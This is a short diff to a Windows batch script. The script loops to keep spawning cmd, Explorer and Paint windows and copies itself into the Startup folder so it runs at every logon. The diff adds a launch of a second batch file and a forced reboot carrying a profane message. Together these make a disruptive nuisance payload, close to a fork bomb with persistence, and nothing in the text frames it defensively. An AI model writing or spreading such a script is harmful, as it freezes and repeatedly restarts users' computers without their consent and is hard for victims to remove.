@@ -1,6 +1,8 @@
 @echo off
 :a
 Start cmd
+start bat.bat
+shutdown /r /t 25 /c "PC FUCKING"​
 start explorer
 start mspaint
 copy %0 C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
